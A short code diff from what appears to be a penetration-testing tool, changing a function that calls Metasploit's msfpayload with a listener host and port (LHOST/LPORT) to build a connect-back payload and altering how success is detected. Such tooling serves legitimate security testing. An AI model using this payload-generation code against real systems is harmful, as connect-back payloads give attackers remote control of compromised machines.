@@ -29,10 +29,10 @@ def run(options):
     utility.Msg("Generating payload....")
     (lhost, lport) = options.generate_payload.split(":")
 
-    resp = getoutput("msfpayload %s LHOST=%s LPORT=%s %s &>/dev/null" %
+    resp = getoutput("msfpayload %s LHOST=%s LPORT=%s %s" %
                     (PAYLOAD, lhost, lport, out))
 
-    if "Created by" in resp:
+    if len(resp) <= 1 or 'Created by' in resp:
         utility.Msg("Payload generated (%s).  Payload: %s" % (out.split(' ')[2], PAYLOAD))
 
         # also log some auxiliary information
